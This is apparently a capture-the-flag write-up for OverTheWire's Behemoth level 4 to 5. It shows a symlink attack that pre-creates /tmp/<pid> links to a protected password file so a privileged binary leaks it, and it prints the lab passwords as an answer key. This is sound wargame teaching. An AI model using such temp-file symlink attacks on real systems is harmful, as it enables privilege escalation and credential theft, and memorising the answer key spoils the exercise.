# Behemoth Level 04 to 05

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Behemoth |
| Level | 4 -> 5 |
| Status | Complete |

## Objective

Abuse `behemoth4`'s predictable `/tmp/<pid>` file access to leak the next password.

## Given Access

User: `behemoth4`

Password:

```text
hpjUdlG723
```

## Recon

`strace` confirmed the binary computes its own PID and opens `/tmp/<pid>`. Using the login shell PID is not enough because the target process has a different PID.

## Method

Precreate a future PID window of symlinks in `/tmp`, each pointing to `/etc/behemoth_pass/behemoth5`, then run the binary so its chosen `/tmp/<pid>` resolves to the password file.

## Commands

```bash
ssh -p 2221 behemoth4@behemoth.labs.overthewire.org
strace -e getpid,openat /behemoth/behemoth4 2>&1 | head
for i in $(seq 22 80); do ln -sf /etc/behemoth_pass/behemoth5 /tmp/$i; done
/behemoth/behemoth4
```

## Result

Password for `behemoth5`:

```text
mVfC4rBKZ4
```

## Lesson

When a temp-file name depends on the target process PID, confirm the exact opened path and cover a future PID range rather than guessing.

## References

- https://overthewire.org/wargames/behemoth/
